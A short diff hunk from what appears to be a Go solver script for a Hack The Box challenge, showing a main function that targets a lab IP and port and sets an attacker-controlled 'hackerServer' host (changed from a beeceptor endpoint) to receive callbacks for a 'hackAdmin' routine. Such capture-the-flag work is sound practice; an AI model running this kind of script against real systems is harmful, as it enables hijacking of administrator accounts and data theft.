@@ -85,7 +85,7 @@ func hackAdmin(url string) {
 func main() {
 	fmt.Println("config your Server to listen on /static/viewletter.js")
 	url := "http://94.237.63.93:30903/"
-	hackerServer := "htbsolver.free.beeceptor.com"
+	hackerServer := "htbsolver.server"
 	id := getCurrentMessageId(url)
 	if id != 0 {
 		fmt.Println("Will start after id:", id)
